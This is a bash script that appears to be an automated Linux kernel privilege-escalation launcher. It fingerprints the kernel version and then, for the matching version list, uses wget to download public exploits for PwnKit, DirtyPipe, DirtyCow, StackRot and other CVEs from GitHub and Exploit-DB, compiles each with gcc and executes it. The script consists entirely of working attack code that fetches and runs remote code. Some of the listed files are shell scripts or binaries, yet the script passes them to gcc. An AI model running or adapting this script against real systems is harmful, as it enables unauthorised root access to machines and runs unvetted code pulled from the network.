#!/bin/bash

KERNEL_VERSION=$(uname -r)
OS_INFO=$(grep -w "PRETTY_NAME" /etc/os-release | cut -d= -f2)
ARCH=$(uname -m)

LOG_FILE="/tmp/exploit_log.txt"
echo "// created by alexithema | asmodeus 1337" | tee -a "$LOG_FILE"

echo "Checking for gcc..." | tee -a "$LOG_FILE"
if ! command -v gcc &> /dev/null; then
    echo "Error: gcc is not installed. Please install gcc and try again." | tee -a "$LOG_FILE"
    exit 1
fi

echo "Kernel Version: $KERNEL_VERSION" | tee -a "$LOG_FILE"
echo "OS Info: $OS_INFO" | tee -a "$LOG_FILE"
echo "Architecture: $ARCH" | tee -a "$LOG_FILE"

declare -A EXPLOIT_LIST=(
    ["CVE-2022-0847"]="https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/dirtypipez.c"
    ["CVE-2021-4034"]="https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c"
    ["CVE-2016-5195"]="https://www.exploit-db.com/download/40839"
    ["CVE-2017-16995"]="https://www.exploit-db.com/download/44298"
    ["CVE-2023-3269"]="https://raw.githubusercontent.com/lrh2000/StackRot/main/stackrot.c"
    ["CVE-2024-1086"]="https://raw.githubusercontent.com/Notselwyn/CVE-2024-1086/main/exploit.c"
    ["CVE-2016-0728"]="https://www.exploit-db.com/download/40003"
    ["CVE-2019-13272"]="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c"
    ["CVE-2014-3153"]="https://www.exploit-db.com/download/33589"
    ["CVE-2021-22555"]="https://www.exploit-db.com/download/50098"
)

KERNEL_MAJOR=$(echo $KERNEL_VERSION | cut -d'.' -f1)
KERNEL_MINOR=$(echo $KERNEL_VERSION | cut -d'.' -f2)

select_exploit() {
    if [[ $KERNEL_MAJOR -eq 5 ]]; then
        echo "Using Kernel 5.x exploits" | tee -a "$LOG_FILE"
        EXPLOIT_URLS=(
            "https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c"
            "https://raw.githubusercontent.com/Markakd/CVE-2022-2588/master/exp_file_credential"
            "https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh"
            "https://www.exploit-db.com/download/50098"
        )
    elif [[ $KERNEL_MAJOR -eq 4 ]]; then
        echo "Using Kernel 4.x exploits" | tee -a "$LOG_FILE"
        EXPLOIT_URLS=(
            "https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit"
            "https://www.exploit-db.com/download/44298"
            "https://www.exploit-db.com/download/40839"
        )
    elif [[ $KERNEL_MAJOR -eq 3 ]]; then
        echo "Using Kernel 3.x exploits" | tee -a "$LOG_FILE"
        EXPLOIT_URLS=(
            "https://www.exploit-db.com/download/40839"
            "https://raw.githubusercontent.com/lrh2000/StackRot/main/stackrot.c"
            "https://www.exploit-db.com/download/33589"
        )
    else
        echo "No specific exploits found for this kernel version." | tee -a "$LOG_FILE"
        return 1
    fi
    return 0
}

execute_exploit() {
    local url=$1
    local file=$(basename "$url")
    echo "Downloading exploit: $url" | tee -a "$LOG_FILE"
    wget -q "$url" -O "$file"
    if [[ $? -eq 0 ]]; then
        echo "Compiling $file..." | tee -a "$LOG_FILE"
        gcc "$file" -o exploit &> /dev/null
        if [[ $? -eq 0 ]]; then
            echo "Executing exploit..." | tee -a "$LOG_FILE"
            chmod +x exploit
            ./exploit | tee -a "$LOG_FILE"
        else
            echo "Compilation failed: $file" | tee -a "$LOG_FILE"
        fi
    else
        echo "Download failed: $url" | tee -a "$LOG_FILE"
    fi
}

select_exploit
if [[ $? -eq 0 ]]; then
    for exploit in "${EXPLOIT_URLS[@]}"; do
        execute_exploit "$exploit"
    done
fi

echo "All exploits attempted." | tee -a "$LOG_FILE"
